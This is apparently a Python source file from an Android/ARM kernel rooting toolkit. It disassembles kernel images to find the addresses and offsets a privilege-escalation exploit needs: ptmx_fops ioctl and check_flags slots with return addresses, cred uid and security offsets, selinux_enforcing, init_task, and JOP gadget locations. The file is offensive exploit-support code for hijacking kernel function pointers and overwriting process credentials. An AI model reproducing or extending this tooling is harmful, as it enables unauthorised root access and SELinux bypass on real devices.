#!/usr/bin/env python
# encoding: utf-8
"""
@author:     idhyt3r@gmail.com
@date:
@description:

"""
import sys
import kdisasm


ckdisasm = None

KERNEL_BASE_ADDR = 0

platform = 0

ERROR_VALUE = 0x22222222

# patch tags
patch_addr_tags = {
    "ptmx_fops_ioctl_offset": {},
    "ptmx_fops_ioctl_back_addr": {},
    "task_cred_security_offset": {},
    "task_cred_uid_offset": {},
    "fops_check_flags_offset": {},
}

patch_addr_list = {
    "version": "",
    "selinux_enforcing": 1,  #
    "init_task": 1,
    "ptmx_fops": 1,  # 101
    "ptmx_fops_ioctl_offset": ERROR_VALUE,  # 102
    "ptmx_fops_ioctl_back_addr": ERROR_VALUE,
    "task_cred_security_offset": ERROR_VALUE,    # 105
    "task_cred_uid_offset": ERROR_VALUE,    # 109
    "tty_ioctl": 1,
    "usb_hcd_irq": 1,
    # "kernel_sock_ioctl": 0,    # 107
    "fops_check_flags_offset": ERROR_VALUE,   # 103
    "fops_check_flags_back_addr": ERROR_VALUE,
}


def patch_addr_list_insert(key_, value_):
    global patch_addr_list

    return patch_addr_list.setdefault(key_, value_)


# task_cred_security_offset
x32_task_cred_security_offset_tags = {
    "cred_has_capability": {
        "0": [
            "ldr ip, [r0,",  # ldr ip, [r0, #0x58]
        ],
        "1": [
            "ldr r3, [r0,",  # ldr ip, [r0, #0x58]
        ],
        "2": [
            "ldr r0, [r0,",
        ],
        "3": [
            "ldr r12, [r0,",
        ]
    },

    "ext": {}

}

x32_ptmx_fops_ioctl_offset_tag = {
    "do_vfs_ioctl": {
        "0": [
            "#0xffff",  # movt r3, #0xffff
            "#0xfdfd",  # movw r3, #0xfdfd
            "blx",  # blx r3
            "ldr regs"  # ldr r3, [r3, #0x20]
        ],
    },

    "ext": {}

}

# ptmx_fops_ioctl_back
x32_ptmx_fops_ioctl_back_addr_tags = {
    "do_vfs_ioctl": {
        "0": [
            "movw r3, #0xfdfd",
            "movt r3, #0xffff",
            "cmp r0, r3",
        ],
    },

    "ext": {}
}

# ptmx_fops_ioctl_back
x32_task_cred_uid_offset_tags = {
    "set_user": {
        "0": [
            "mov r4, r0",
            "ldr r1, [r4, #",
        ],

        "1": [
            "mov r4, r0",
            "ldr r0, [r0,",
        ]
    },

    "set_task_ioprio": {
        "0": [
            "ldr r3, [r4, #",
            "ldr r2, [r5, #",
            "ldr r3, [r3,",
        ]
    },

    "ext": {}
}

x32_fops_check_flags_offset_tags = {
    "do_fcntl": {
        "0": [
            "ldr r3, [r3, #",
            "cmp r3, #0",
            "beq",
            "mov r0, r6",
            "blx r3",
        ],
    },

    "ext": {}
}


def arm32():
    global patch_addr_tags, platform

    platform = 32

    patch_addr_tags["task_cred_security_offset"] = x32_task_cred_security_offset_tags

    patch_addr_tags["ptmx_fops_ioctl_offset"] = x32_ptmx_fops_ioctl_offset_tag

    patch_addr_tags["ptmx_fops_ioctl_back_addr"] = x32_ptmx_fops_ioctl_back_addr_tags

    patch_addr_tags["task_cred_uid_offset"] = x32_task_cred_uid_offset_tags

    patch_addr_tags["fops_check_flags_offset"] = x32_fops_check_flags_offset_tags


# task_cred_security_offset
x64_task_cred_security_offset_tags = {
    "cred_has_capability": {
        "0": [
            "ldr x0, [x0,",  # ldr x0, [x0, 0x48]
        ],
        "1": [
            "ldr x5, [x0,"  # LDR X5, [X0,#0x78]
        ],
    },

    "ext": {}

}
# ptmx_fops_ioctl_offset
x64_ptmx_fops_ioctl_offset_tags = {
    "do_vfs_ioctl": {
        "0": [
            "#0x203",  # cmn w0, #0x203
            "blr",  # blr x3
            "ldr regs"  # ldr x3, [x0, #0x40]
        ],
    },

    "ext": {}
}

# ptmx_fops_ioctl_back
x64_ptmx_fops_ioctl_back_addr_tags = {
    "do_vfs_ioctl": {
        "0": [
            "cmn w0, #0x203",  # #define ENOIOCTLCMD   515 /* No ioctl command */
        ],
    },

    "ext": {}
}

x64_task_cred_uid_offset_tags = {
    "set_user": {
        "0": [
            "ldr r1, [r4",
        ],
    },

    "ext": {}
}

x64_fops_check_flags_offset_tags = {
    "sys_fcntl": {
        "0": [
            "ldr x0, [x20, #0x28]",
            "ldr x1, [x0,",
        ],
    },

    "ext": {}
}


def arm64():
    global patch_addr_tags, platform

    platform = 64

    patch_addr_tags["task_cred_security_offset"] = x64_task_cred_security_offset_tags

    patch_addr_tags["ptmx_fops_ioctl_offset"] = x64_ptmx_fops_ioctl_offset_tags

    patch_addr_tags["ptmx_fops_ioctl_back_addr"] = x64_ptmx_fops_ioctl_back_addr_tags

    patch_addr_tags["task_cred_uid_offset"] = x64_task_cred_uid_offset_tags

    patch_addr_tags["fops_check_flags_offset"] = x64_fops_check_flags_offset_tags


def show_asm_info(info):
    print("\t%s" % info)
    pass


def check_in(check_list, target_list, target_index):
    check_len = len(check_list)
    in_len = 0
    for x in range(check_len):
        # print("!!!! %d, %s" % (x, check_list[x]))
        if check_list[x] in target_list[target_index + x]:
            in_len += 1

    if in_len == check_len:
        return 1

    return 0


# thread_info -> task -> cred -> security
# cred_has_capability()
def get_task_cred_security_offset():
    patch_tags = patch_addr_tags["task_cred_security_offset"]

    for func, tags_list in patch_tags.items():
        if not tags_list:
            continue

        print("[!] find task_cred_security_offset in <%s>" % func)

        asm_list = ckdisasm.get_asm_by_name(func)

        for n, tags in tags_list.items():
            print(" [%s] to find tags %s" % (n, tags))

            if platform == 32:
                for x in range(len(asm_list)-len(tags)):
                    show_asm_info(asm_list[x])
                    # print(asm)
                    if check_in(tags, asm_list, x) == 1:
                        patch_addr_list["task_cred_security_offset"] = long(asm_list[x].split("#")[-1].strip("]"), 16)
                        break

            elif platform == 64:
                for asm in asm_list:
                    show_asm_info(asm)
                    if tags[0] in asm:
                        patch_addr_list["task_cred_security_offset"] = long(asm.split("#")[-1].strip("]"), 16)
                        break

            if patch_addr_list["task_cred_security_offset"] != ERROR_VALUE:
                print("[+] task_cred_security_offset = 0x%lx" % patch_addr_list["task_cred_security_offset"])
                return patch_addr_list["task_cred_security_offset"]


# do_vfs_ioctl
def get_ptmx_fops_ioctl_offset():
    patch_tags = patch_addr_tags["ptmx_fops_ioctl_offset"]

    for func, tags_list in patch_tags.items():
        if not tags_list:
            continue

        print("[!] find ptmx_fops_ioctl_offset in <%s>" % func)

        asm_list = ckdisasm.get_asm_by_name(func)

        for n, tags in tags_list.items():
            print(" [%s] to find tags %s" % (n, tags))
            if platform == 32:
                i, regs = 0, ""
                for index, asm in enumerate(reversed(asm_list)):
                    show_asm_info(asm)
                    if i == 0:
                        if tags[0] in asm and tags[1] in asm_list[len(asm_list) - 1 - index - 1]:
                            i += 1
                            continue

                    if i == 1:
                        if tags[2] in asm:
                            regs = asm.split(" ")[-1].strip()
                            tags[3] = tags[3].replace("regs", regs)
                            i += 1
                            continue

                    if i == 2:
                        if tags[3] in asm:
                            patch_addr_list["ptmx_fops_ioctl_offset"] = long(asm.split("#")[-1].strip("]"), 16)
                            break

            elif platform == 64:
                i, regs = 0, ""
                for asm in reversed(asm_list):
                    if i == 0:
                        if tags[0] in asm:
                            i += 1
                            continue

                    if i == 1:
                        if tags[1] in asm:
                            regs = asm.split(" ")[-1].strip()
                            tags[2] = tags[2].replace("regs", regs)
                            i += 1
                            continue

                    if i == 2:
                        if tags[2] in asm:
                            patch_addr_list["ptmx_fops_ioctl_offset"] = long(asm.split("#")[-1].strip("]"), 16)
                            break

            if patch_addr_list["ptmx_fops_ioctl_offset"] > 0:
                print("[+] ptmx_fops_ioctl_offset = 0x%lx" % patch_addr_list["ptmx_fops_ioctl_offset"])
                return patch_addr_list["ptmx_fops_ioctl_offset"]


# patch do_vfs_ioctl->vfs_ioctl(unlocked_ioctl) back address
def get_ptmx_fops_ioctl_back_addr():
    patch_tags = patch_addr_tags["ptmx_fops_ioctl_back_addr"]

    for func, tags_list in patch_tags.items():
        if not tags_list:
            continue

        print("[!] find ptmx_fops_ioctl_back_addr in <%s>" % func)

        asm_list = ckdisasm.get_asm_by_name(func)

        for n, tags in tags_list.items():
            print(" [%s] to find tags %s" % (n, tags))

            if platform == 32:
                for x in range(len(asm_list)):
                    show_asm_info(asm_list[x])
                    if tags[0] in asm_list[x] and tags[1] in asm_list[x + 1] and tags[2] in asm_list[x + 2]:
                        patch_addr_list["ptmx_fops_ioctl_back_addr"] = long(asm_list[x].split(":")[0].strip(), 16)
                        break

            elif platform == 64:
                for asm in asm_list:
                    show_asm_info(asm)
                    if tags[0] in asm:
                        patch_addr_list["ptmx_fops_ioctl_back_addr"] = long(asm.split(":")[0].strip(), 16)
                        break

            if patch_addr_list["ptmx_fops_ioctl_back_addr"] > KERNEL_BASE_ADDR:
                print("[+] ioctl_back_address = 0x%lx" % patch_addr_list["ptmx_fops_ioctl_back_addr"])
                return patch_addr_list["ptmx_fops_ioctl_back_addr"]


# patch task.cred{} uid offset
def get_task_cred_uid_offset():
    patch_tags = patch_addr_tags["task_cred_uid_offset"]

    for func, tags_list in patch_tags.items():
        if not tags_list:
            continue

        print("[!] find task_cred_uid_offset in <%s>" % func)

        asm_list = ckdisasm.get_asm_by_name(func)
        if not asm_list:
            continue

        for n, tags in tags_list.items():
            print(" [%s] to find tags %s" % (n, tags))

            if platform == 32:
                for x in range(len(asm_list)-len(tags)):
                    show_asm_info(asm_list[x])
                    if check_in(tags, asm_list, x) == 1:
                        patch_addr_list["task_cred_uid_offset"] = \
                            long(asm_list[x+len(tags)-1].split("#")[-1].strip("]"), 16)
                        break

            elif platform == 64:
                break

            if patch_addr_list["task_cred_uid_offset"] != ERROR_VALUE:
                print("[+] task_cred_uid_offset = 0x%lx" % patch_addr_list["task_cred_uid_offset"])
                return patch_addr_list["task_cred_uid_offset"]


# patch ptmx_fops->check_flags() offset
def get_fops_check_flags_offset():
    patch_tags = patch_addr_tags["fops_check_flags_offset"]

    for func, tags_list in patch_tags.items():
        if not tags_list:
            continue

        print("[!] find fops_check_flags_offset in <%s>" % func)

        asm_list = ckdisasm.get_asm_by_name(func)

        for n, tags in tags_list.items():
            print(" [%s] to find tags %s" % (n, tags))

            if platform == 32:
                for x in range(len(asm_list)):
                    if check_in(tags, asm_list, x) == 1:
                        patch_addr_list["fops_check_flags_offset"] = long(asm_list[x].split("#")[-1].strip("]"), 16)
                        patch_addr_list["fops_check_flags_back_addr"] = \
                            long(asm_list[x].split(":")[0].strip(), 16) + 0x14
                        break

            elif platform == 64:
                for x in range(len(asm_list)):
                    if tags[0] in asm_list[x] and tags[1] in asm_list[x+1]:
                        patch_addr_list["fops_check_flags_offset"] = long(asm_list[x+1].split("#")[-1].strip("]"), 16)
                        patch_addr_list["fops_check_flags_back_addr"] = \
                            long(asm_list[x].split(":")[0].strip(), 16) + 0x14
                        break

            if patch_addr_list["fops_check_flags_offset"] > KERNEL_BASE_ADDR:
                print("[+] fops_check_flags_offset = 0x%lx" % patch_addr_list["fops_check_flags_offset"])
                return patch_addr_list["fops_check_flags_offset"]


"""
    patch_ioctl_jop = [
        "ldr x2, [x2, #0x10]",
        "ldr x1, [x1, #0x18]",
        "ldr x2, [x2, #0x20]",
        "blr x2"
    ]
    return get_rop_gaget_addr("stat_seq_show", patch_ioctl_jop)

"""

to_find_jop_gagets = {}


def get_jop_gaget_addr(kfunc_name, jop_gaget_tags):
    print("[!] find jop gaget at <%s>" % kfunc_name)
    jop_gaget_addr = 0
    asm_list = ckdisasm.get_asm_by_name(kfunc_name)
    for x in xrange(len(asm_list) - 1):
        i = x
        show_asm_info(asm_list[i])
        for jop_tag in jop_gaget_tags:
            if jop_tag in asm_list[i]:
                i += 1
        if i - x == len(jop_gaget_tags):
            jop_gaget_addr = long(asm_list[x].split(":")[0].strip(), 16)
            break
    if jop_gaget_addr > KERNEL_BASE_ADDR:
        print("[+] find jop_gaget at 0x%lx" % jop_gaget_addr)
    else:
        print("[-] find jop_gaget false!")

    return jop_gaget_addr


def set_adp_jop_gaget(kfun_name, jop_gaget):
    global to_find_jop_gagets

    if not isinstance(kfun_name, str) or not isinstance(jop_gaget, list):
        raise TypeError

    to_find_jop_gagets.setdefault(kfun_name, jop_gaget)

    print(to_find_jop_gagets)


# u:r:init:s0
def get_selinux_init_context_sid():
    pass


def get_patch_addr():
    # patch addr

    name_list = []

    for key_, value_ in patch_addr_list.iteritems():
        if value_ == 1:
            name_list.append(key_)

    print("[!] To find kallsyms func: %s" % name_list)

    find = ckdisasm.get_kallsyms_instance().find_apis_address(name_list)

    for key_, value_ in patch_addr_list.iteritems():
        if value_ == 1:
            patch_addr_list[key_] = find[key_]

    patch_addr_list["version"] = ckdisasm.get_kernel_instance().get_kernel_version()

    get_ptmx_fops_ioctl_offset()
    get_ptmx_fops_ioctl_back_addr()
    get_task_cred_security_offset()
    get_task_cred_uid_offset()
    get_fops_check_flags_offset()

    for func, addr in patch_addr_list.items():
        if not isinstance(addr, str):
            print("[+] %s = 0x%lx" % (func, addr))
        else:
            print("[+] %s = %s" % (func, addr))

    # jop
    for func, jop_gaget in to_find_jop_gagets.items():
        jop_addr = get_jop_gaget_addr(func, jop_gaget)
        if jop_addr > KERNEL_BASE_ADDR:
            print("[+] jop %s = 0x%lx" % (func, jop_addr))
        else:
            print("[-] jop find false!")

        patch_addr_list.setdefault(func, jop_addr)

    return patch_addr_list


def patch_address(kernel_file, kallsyms_file):
    global ckdisasm, KERNEL_BASE_ADDR
    ckdisasm = kdisasm.KDisAsm(kernel_file, kallsyms_file)
    KERNEL_BASE_ADDR = ckdisasm.get_kernel_instance().get_kernel_base()
    arch = ckdisasm.get_kernel_instance().get_kernel_platform()
    if arch == "arm64":
        arm64()
    elif arch == "arm":
        arm32()

    else:
        print("kernel platform: %s" % arch)
        raise ValueError

    return get_patch_addr()


def main():
    patch_address(sys.argv[1], sys.argv[2])


if __name__ == '__main__':
    main()
